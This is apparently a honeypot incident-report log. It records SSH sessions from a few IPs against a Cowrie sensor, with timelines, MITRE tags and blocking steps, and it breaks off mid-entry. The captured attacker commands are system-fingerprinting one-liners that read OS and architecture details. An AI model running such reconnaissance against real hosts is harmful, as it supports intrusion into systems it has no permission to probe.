
### 🔴 HIGH · IR-8bfdfc244d7b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:44 |
| **Last Seen** | 2026-08-02 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:44:11` | `cowrie.session.connect` |
| `2026-08-02 03:44:11` | `cowrie.client.version` |
| `2026-08-02 03:44:11` | `cowrie.client.kex` |
| `2026-08-02 03:44:12` | `cowrie.login.success` |
| `2026-08-02 03:44:13` | `cowrie.session.params` |
| `2026-08-02 03:44:13` | `cowrie.command.input` |
| `2026-08-02 03:44:13` | `cowrie.log.closed` |
| `2026-08-02 03:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a7af50f1011

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:45 |
| **Last Seen** | 2026-08-02 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:45:01` | `cowrie.session.connect` |
| `2026-08-02 03:45:01` | `cowrie.client.version` |
| `2026-08-02 03:45:01` | `cowrie.client.kex` |
| `2026-08-02 03:45:01` | `cowrie.login.success` |
| `2026-08-02 03:45:02` | `cowrie.session.params` |
| `2026-08-02 03:45:02` | `cowrie.command.input` |
| `2026-08-02 03:45:02` | `cowrie.command.input` |
| `2026-08-02 03:45:02` | `cowrie.command.input` |
| `2026-08-02 03:45:02` | `cowrie.command.input` |
| `2026-08-02 03:45:02` | `cowrie.command.input` |
| `2026-08-02 03:45:02` | `cowrie.command.success` |
| `2026-08-02 03:45:02` | `cowrie.command.input` |
| `2026-08-02 03:45:02` | `cowrie.command.input` |
| `2026-08-02 03:45:02` | `cowrie.command.input` |
| `2026-08-02 03:45:02` | `cowrie.command.input` |
| `2026-08-02 03:45:02` | `cowrie.log.closed` |
| `2026-08-02 03:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8731f79c186e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:45 |
| **Last Seen** | 2026-08-02 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:45:52` | `cowrie.session.connect` |
| `2026-08-02 03:45:52` | `cowrie.client.version` |
| `2026-08-02 03:45:52` | `cowrie.client.kex` |
| `2026-08-02 03:45:52` | `cowrie.login.success` |
| `2026-08-02 03:45:53` | `cowrie.session.params` |
| `2026-08-02 03:45:53` | `cowrie.command.input` |
| `2026-08-02 03:45:53` | `cowrie.log.closed` |
| `2026-08-02 03:45:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-437358ba9b39

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:47 |
| **Last Seen** | 2026-08-02 03:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:47:04` | `cowrie.session.connect` |
| `2026-08-02 03:47:04` | `cowrie.client.version` |
| `2026-08-02 03:47:04` | `cowrie.client.kex` |
| `2026-08-02 03:47:04` | `cowrie.login.success` |
| `2026-08-02 03:47:05` | `cowrie.session.params` |
| `2026-08-02 03:47:05` | `cowrie.command.input` |
| `2026-08-02 03:47:05` | `cowrie.command.input` |
| `2026-08-02 03:47:05` | `cowrie.command.input` |
| `2026-08-02 03:47:05` | `cowrie.command.input` |
| `2026-08-02 03:47:05` | `cowrie.command.input` |
| `2026-08-02 03:47:05` | `cowrie.command.success` |
| `2026-08-02 03:47:05` | `cowrie.command.input` |
| `2026-08-02 03:47:05` | `cowrie.command.input` |
| `2026-08-02 03:47:05` | `cowrie.command.input` |
| `2026-08-02 03:47:05` | `cowrie.command.input` |
| `2026-08-02 03:47:06` | `cowrie.log.closed` |
| `2026-08-02 03:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-800f1c2f2da3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:47 |
| **Last Seen** | 2026-08-02 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:47:24` | `cowrie.session.connect` |
| `2026-08-02 03:47:24` | `cowrie.client.version` |
| `2026-08-02 03:47:25` | `cowrie.client.kex` |
| `2026-08-02 03:47:25` | `cowrie.login.success` |
| `2026-08-02 03:47:26` | `cowrie.session.params` |
| `2026-08-02 03:47:26` | `cowrie.command.input` |
| `2026-08-02 03:47:26` | `cowrie.log.closed` |
| `2026-08-02 03:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41681078c5ce

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:48 |
| **Last Seen** | 2026-08-02 03:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:48:10` | `cowrie.session.connect` |
| `2026-08-02 03:48:10` | `cowrie.client.version` |
| `2026-08-02 03:48:10` | `cowrie.client.kex` |
| `2026-08-02 03:48:11` | `cowrie.login.success` |
| `2026-08-02 03:48:12` | `cowrie.session.params` |
| `2026-08-02 03:48:12` | `cowrie.command.input` |
| `2026-08-02 03:48:12` | `cowrie.command.input` |
| `2026-08-02 03:48:12` | `cowrie.command.input` |
| `2026-08-02 03:48:12` | `cowrie.command.input` |
| `2026-08-02 03:48:12` | `cowrie.command.input` |
| `2026-08-02 03:48:12` | `cowrie.command.success` |
| `2026-08-02 03:48:12` | `cowrie.command.input` |
| `2026-08-02 03:48:12` | `cowrie.command.input` |
| `2026-08-02 03:48:12` | `cowrie.command.input` |
| `2026-08-02 03:48:12` | `cowrie.command.input` |
| `2026-08-02 03:48:12` | `cowrie.log.closed` |
| `2026-08-02 03:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cb9d4e93eb8

| Field | Detail |
|---|---|
| **Source IP** | `34.53.205[.]84` |
| **First Seen** | 2026-08-02 03:48 |
| **Last Seen** | 2026-08-02 03:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:48:52` | `cowrie.session.connect` |
| `2026-08-02 03:48:52` | `cowrie.login.success` |
| `2026-08-02 03:48:52` | `cowrie.session.params` |
| `2026-08-02 03:48:52` | `cowrie.command.input` |
| `2026-08-02 03:48:52` | `cowrie.command.input` |
| `2026-08-02 03:48:52` | `cowrie.command.failed` |
| `2026-08-02 03:48:52` | `cowrie.command.input` |
| `2026-08-02 03:48:52` | `cowrie.log.closed` |
| `2026-08-02 03:48:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.205[.]84` to AbuseIPDB if not already reported
- [ ] Block `34.53.205[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a09023e2fd7b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:48 |
| **Last Seen** | 2026-08-02 03:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:48:54` | `cowrie.session.connect` |
| `2026-08-02 03:48:54` | `cowrie.client.version` |
| `2026-08-02 03:48:54` | `cowrie.client.kex` |
| `2026-08-02 03:48:54` | `cowrie.login.success` |
| `2026-08-02 03:48:55` | `cowrie.session.params` |
| `2026-08-02 03:48:55` | `cowrie.command.input` |
| `2026-08-02 03:48:55` | `cowrie.log.closed` |
| `2026-08-02 03:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38a3e2970228

| Field | Detail |
|---|---|
| **Source IP** | `34.53.205[.]84` |
| **First Seen** | 2026-08-02 03:49 |
| **Last Seen** | 2026-08-02 03:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:49:05` | `cowrie.session.connect` |
| `2026-08-02 03:49:05` | `cowrie.login.success` |
| `2026-08-02 03:49:06` | `cowrie.session.params` |
| `2026-08-02 03:49:06` | `cowrie.command.input` |
| `2026-08-02 03:49:06` | `cowrie.command.failed` |
| `2026-08-02 03:49:08` | `cowrie.log.closed` |
| `2026-08-02 03:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.205[.]84` to AbuseIPDB if not already reported
- [ ] Block `34.53.205[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b245f1b417c6

| Field | Detail |
|---|---|
| **Source IP** | `34.53.205[.]84` |
| **First Seen** | 2026-08-02 03:49 |
| **Last Seen** | 2026-08-02 03:49 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:49:07` | `cowrie.session.connect` |
| `2026-08-02 03:49:07` | `cowrie.login.success` |
| `2026-08-02 03:49:08` | `cowrie.session.params` |
| `2026-08-02 03:49:08` | `cowrie.command.input` |
| `2026-08-02 03:49:21` | `cowrie.log.closed` |
| `2026-08-02 03:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.205[.]84` to AbuseIPDB if not already reported
- [ ] Block `34.53.205[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd167fa58f1f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:49 |
| **Last Seen** | 2026-08-02 03:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:49:17` | `cowrie.session.connect` |
| `2026-08-02 03:49:17` | `cowrie.client.version` |
| `2026-08-02 03:49:17` | `cowrie.client.kex` |
| `2026-08-02 03:49:19` | `cowrie.login.success` |
| `2026-08-02 03:49:20` | `cowrie.session.params` |
| `2026-08-02 03:49:20` | `cowrie.command.input` |
| `2026-08-02 03:49:20` | `cowrie.command.input` |
| `2026-08-02 03:49:20` | `cowrie.command.input` |
| `2026-08-02 03:49:20` | `cowrie.command.input` |
| `2026-08-02 03:49:20` | `cowrie.command.input` |
| `2026-08-02 03:49:20` | `cowrie.command.success` |
| `2026-08-02 03:49:20` | `cowrie.command.input` |
| `2026-08-02 03:49:20` | `cowrie.command.input` |
| `2026-08-02 03:49:20` | `cowrie.command.input` |
| `2026-08-02 03:49:20` | `cowrie.command.input` |
| `2026-08-02 03:49:20` | `cowrie.log.closed` |
| `2026-08-02 03:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6c28e6e4c2b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:50 |
| **Last Seen** | 2026-08-02 03:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:50:22` | `cowrie.session.connect` |
| `2026-08-02 03:50:22` | `cowrie.client.version` |
| `2026-08-02 03:50:22` | `cowrie.client.kex` |
| `2026-08-02 03:50:23` | `cowrie.login.success` |
| `2026-08-02 03:50:24` | `cowrie.session.params` |
| `2026-08-02 03:50:24` | `cowrie.command.input` |
| `2026-08-02 03:50:24` | `cowrie.command.input` |
| `2026-08-02 03:50:24` | `cowrie.command.input` |
| `2026-08-02 03:50:24` | `cowrie.command.input` |
| `2026-08-02 03:50:24` | `cowrie.command.input` |
| `2026-08-02 03:50:24` | `cowrie.command.success` |
| `2026-08-02 03:50:24` | `cowrie.command.input` |
| `2026-08-02 03:50:24` | `cowrie.command.input` |
| `2026-08-02 03:50:24` | `cowrie.command.input` |
| `2026-08-02 03:50:24` | `cowrie.command.input` |
| `2026-08-02 03:50:25` | `cowrie.log.closed` |
| `2026-08-02 03:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb3324f5d6c6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:50 |
| **Last Seen** | 2026-08-02 03:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:50:27` | `cowrie.session.connect` |
| `2026-08-02 03:50:27` | `cowrie.client.version` |
| `2026-08-02 03:50:28` | `cowrie.client.kex` |
| `2026-08-02 03:50:28` | `cowrie.login.success` |
| `2026-08-02 03:50:29` | `cowrie.session.params` |
| `2026-08-02 03:50:29` | `cowrie.command.input` |
| `2026-08-02 03:50:29` | `cowrie.log.closed` |
| `2026-08-02 03:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95f93b4f5da8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:51 |
| **Last Seen** | 2026-08-02 03:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:51:30` | `cowrie.session.connect` |
| `2026-08-02 03:51:30` | `cowrie.client.version` |
| `2026-08-02 03:51:30` | `cowrie.client.kex` |
| `2026-08-02 03:51:32` | `cowrie.login.success` |
| `2026-08-02 03:51:34` | `cowrie.session.params` |
| `2026-08-02 03:51:34` | `cowrie.command.input` |
| `2026-08-02 03:51:34` | `cowrie.command.input` |
| `2026-08-02 03:51:34` | `cowrie.command.input` |
| `2026-08-02 03:51:34` | `cowrie.command.input` |
| `2026-08-02 03:51:34` | `cowrie.command.input` |
| `2026-08-02 03:51:34` | `cowrie.command.success` |
| `2026-08-02 03:51:34` | `cowrie.command.input` |
| `2026-08-02 03:51:34` | `cowrie.command.input` |
| `2026-08-02 03:51:34` | `cowrie.command.input` |
| `2026-08-02 03:51:34` | `cowrie.command.input` |
| `2026-08-02 03:51:35` | `cowrie.log.closed` |
| `2026-08-02 03:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bbc8c4ff4f1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:52 |
| **Last Seen** | 2026-08-02 03:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:52:05` | `cowrie.session.connect` |
| `2026-08-02 03:52:05` | `cowrie.client.version` |
| `2026-08-02 03:52:05` | `cowrie.client.kex` |
| `2026-08-02 03:52:05` | `cowrie.login.success` |
| `2026-08-02 03:52:06` | `cowrie.session.params` |
| `2026-08-02 03:52:06` | `cowrie.command.input` |
| `2026-08-02 03:52:06` | `cowrie.log.closed` |
| `2026-08-02 03:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1db9272f3369

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:52 |
| **Last Seen** | 2026-08-02 03:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:52:32` | `cowrie.session.connect` |
| `2026-08-02 03:52:32` | `cowrie.client.version` |
| `2026-08-02 03:52:32` | `cowrie.client.kex` |
| `2026-08-02 03:52:34` | `cowrie.login.success` |
| `2026-08-02 03:52:35` | `cowrie.session.params` |
| `2026-08-02 03:52:35` | `cowrie.command.input` |
| `2026-08-02 03:52:35` | `cowrie.command.input` |
| `2026-08-02 03:52:35` | `cowrie.command.input` |
| `2026-08-02 03:52:35` | `cowrie.command.input` |
| `2026-08-02 03:52:35` | `cowrie.command.input` |
| `2026-08-02 03:52:35` | `cowrie.command.success` |
| `2026-08-02 03:52:35` | `cowrie.command.input` |
| `2026-08-02 03:52:35` | `cowrie.command.input` |
| `2026-08-02 03:52:35` | `cowrie.command.input` |
| `2026-08-02 03:52:35` | `cowrie.command.input` |
| `2026-08-02 03:52:36` | `cowrie.log.closed` |
| `2026-08-02 03:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-533f8ae38157

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:53 |
| **Last Seen** | 2026-08-02 03:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:53:35` | `cowrie.session.connect` |
| `2026-08-02 03:53:35` | `cowrie.client.version` |
| `2026-08-02 03:53:35` | `cowrie.client.kex` |
| `2026-08-02 03:53:37` | `cowrie.login.success` |
| `2026-08-02 03:53:38` | `cowrie.session.params` |
| `2026-08-02 03:53:38` | `cowrie.command.input` |
| `2026-08-02 03:53:38` | `cowrie.command.input` |
| `2026-08-02 03:53:38` | `cowrie.command.input` |
| `2026-08-02 03:53:38` | `cowrie.command.input` |
| `2026-08-02 03:53:38` | `cowrie.command.input` |
| `2026-08-02 03:53:38` | `cowrie.command.success` |
| `2026-08-02 03:53:38` | `cowrie.command.input` |
| `2026-08-02 03:53:38` | `cowrie.command.input` |
| `2026-08-02 03:53:38` | `cowrie.command.input` |
| `2026-08-02 03:53:38` | `cowrie.command.input` |
